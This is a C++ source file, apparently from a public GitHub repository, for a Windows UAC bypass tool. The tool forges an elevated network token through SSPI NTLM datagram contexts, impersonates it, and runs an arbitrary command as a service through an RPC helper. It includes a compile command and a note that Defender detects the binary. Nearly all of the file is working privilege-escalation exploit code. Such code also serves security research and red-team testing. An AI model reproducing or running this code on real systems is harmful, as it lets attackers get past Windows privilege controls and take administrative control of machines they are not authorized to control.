// Source: https://github.com/antonioCoco/SspiUacBypass
// HEADS UP: This standalone binary will be detected statically by defender as: VirTool:Win64/Uacsspi.A
// x86_64-w64-mingw32-g++ SspiUacBypass.cpp CreateSvcRpc.cpp -static -lsecur32 -s -w -o /share/SspiUacBypass.exe
#define SECURITY_WIN32

#include <windows.h>
#include <stdio.h>
#include <security.h>
#include "CreateSvcRpc.h"

#define SEC_SUCCESS(Status) ((Status) >= 0)
#define MAX_MESSAGE_SIZE 12000

HANDLE ForgeNetworkAuthToken();
void CheckTokenSession(HANDLE hToken);
BOOL IsThreadTokenIdentification();

int main(int argc, char* argv[]) 
{
	char defaultCmdline[] = "cmd /c \"whoami > C:\\Windows\\bypassuac.txt\"";
	char* cmdline = defaultCmdline;
	HANDLE hNetworkToken = INVALID_HANDLE_VALUE;

	if (argc > 1)
		cmdline = argv[1];

	printf("\n\tSspiUacBypass - Bypassing UAC with SSPI Datagram Contexts\n\tby @splinter_code\n\n");
	printf("Forging a token from a fake Network Authentication through Datagram Contexts\n");
	hNetworkToken = ForgeNetworkAuthToken();
	if (hNetworkToken == INVALID_HANDLE_VALUE) {
		printf("Cannot forge the network auth token, exiting...\n");
		return 1;
	}
	printf("Network Authentication token forged correctly, handle --> 0x%x\n", hNetworkToken);
	CheckTokenSession(hNetworkToken);
	ImpersonateLoggedOnUser(hNetworkToken);
	// Some Windows versions check if the current process token session ID matches the forged token session ID
	// Older Windows versions don't, so trying anyway to impersonate even if the forged token session ID is 0
	if (IsThreadTokenIdentification()) {
		printf("Impersonating the forged token returned an Identification token. Bypass failed :( \n");
	}
	else {
		printf("Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now\n");
		InvokeCreateSvcRpcMain(cmdline);
	}
	RevertToSelf();
	CloseHandle(hNetworkToken);
	return 0;
}

HANDLE ForgeNetworkAuthToken() {
	CredHandle hCredClient, hCredServer;
	TimeStamp lifetimeClient, lifetimeServer;
	SecBufferDesc negotiateDesc, challengeDesc, authenticateDesc;
	SecBuffer negotiateBuffer, challengeBuffer, authenticateBuffer;
	CtxtHandle clientContextHandle, serverContextHandle;
	ULONG clientContextAttributes, serverContextAttributes;
	SECURITY_STATUS secStatus;
	HANDLE hTokenNetwork = INVALID_HANDLE_VALUE;
	SEC_CHAR* NTLMSP_NAME2 = "NTLM";

	secStatus = AcquireCredentialsHandle(NULL, NTLMSP_NAME2, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredClient, &lifetimeClient);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcquireCredentialsHandle Client failed with secstatus code 0x%x \n", secStatus);
		return NULL;
	}

	secStatus = AcquireCredentialsHandle(NULL, NTLMSP_NAME2, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hCredServer, &lifetimeServer);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcquireCredentialsHandle Server failed with secstatus code 0x%x \n", secStatus);
		return NULL;
	}

	negotiateDesc.ulVersion = 0;
	negotiateDesc.cBuffers = 1;
	negotiateDesc.pBuffers = &negotiateBuffer;
	negotiateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
	negotiateBuffer.BufferType = SECBUFFER_TOKEN;
	negotiateBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
	secStatus = InitializeSecurityContext(&hCredClient, NULL, NULL, ISC_REQ_DATAGRAM, 0, SECURITY_NATIVE_DREP, NULL, 0, &clientContextHandle, &negotiateDesc, &clientContextAttributes, &lifetimeClient);
	if (!SEC_SUCCESS(secStatus)) {
		printf("InitializeSecurityContext Type 1 failed with secstatus code 0x%x \n", secStatus);
		return NULL;
	}

	challengeDesc.ulVersion = 0;
	challengeDesc.cBuffers = 1;
	challengeDesc.pBuffers = &challengeBuffer;
	challengeBuffer.cbBuffer = MAX_MESSAGE_SIZE;
	challengeBuffer.BufferType = SECBUFFER_TOKEN;
	challengeBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
	secStatus = AcceptSecurityContext(&hCredServer, NULL, &negotiateDesc, ASC_REQ_DATAGRAM, SECURITY_NATIVE_DREP, &serverContextHandle, &challengeDesc, &serverContextAttributes, &lifetimeServer);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcceptSecurityContext Type 2 failed with secstatus code 0x%x \n", secStatus);
		return NULL;
	}

	authenticateDesc.ulVersion = 0;
	authenticateDesc.cBuffers = 1;
	authenticateDesc.pBuffers = &authenticateBuffer;
	authenticateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
	authenticateBuffer.BufferType = SECBUFFER_TOKEN;
	authenticateBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
	secStatus = InitializeSecurityContext(NULL, &clientContextHandle, NULL, 0, 0, SECURITY_NATIVE_DREP, &challengeDesc, 0, &clientContextHandle, &authenticateDesc, &clientContextAttributes, &lifetimeClient);
	if (!SEC_SUCCESS(secStatus)) {
		printf("InitializeSecurityContext Type 3 failed with secstatus code 0x%x \n", secStatus);
		return NULL;
	}

	secStatus = AcceptSecurityContext(NULL, &serverContextHandle, &authenticateDesc, 0, SECURITY_NATIVE_DREP, &serverContextHandle, NULL, &serverContextAttributes, &lifetimeServer);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcceptSecurityContext failed with secstatus code 0x%x \n", secStatus);
		return NULL;
	}
	QuerySecurityContextToken(&serverContextHandle, &hTokenNetwork);

	HeapFree(GetProcessHeap(), 0, negotiateBuffer.pvBuffer);
	HeapFree(GetProcessHeap(), 0, challengeBuffer.pvBuffer);
	HeapFree(GetProcessHeap(), 0, authenticateBuffer.pvBuffer);
	FreeCredentialsHandle(&hCredClient);
	FreeCredentialsHandle(&hCredServer);
	DeleteSecurityContext(&clientContextHandle);
	DeleteSecurityContext(&serverContextHandle);

	return hTokenNetwork;
}

void CheckTokenSession(HANDLE hToken) {
	DWORD retLenght = 0;
	DWORD tokenSessionId = 0;
	if (!GetTokenInformation(hToken, TokenSessionId, &tokenSessionId, sizeof(DWORD), &retLenght)) {
		printf("GetTokenInformation failed with error code %d \n", GetLastError());
		return;
	}
	// This should be always true for Windows versions <= 10 Build 1809 
	if (tokenSessionId == 0)
		printf("Forged Token Session ID set to 0. Older Win version detected, lsasrv!LsapApplyLoopbackSessionId probably not present here...\n");
	else
		printf("Forged Token Session ID set to %d. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session \n", tokenSessionId);
}

BOOL IsThreadTokenIdentification() {
	HANDLE hTokenImp;
	SECURITY_IMPERSONATION_LEVEL impLevel;
	DWORD retLenght = 0;
	if(!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
		printf("OpenThreadToken failed with error code %d \n", GetLastError());
		return FALSE;
	}
	if (!GetTokenInformation(hTokenImp, TokenImpersonationLevel, &impLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &retLenght)) {
		printf("GetTokenInformation failed with error code %d \n", GetLastError());
		return FALSE;
	}
	if (impLevel < SecurityImpersonation)
		return TRUE;
	else
		return FALSE;
	CloseHandle(hTokenImp);
}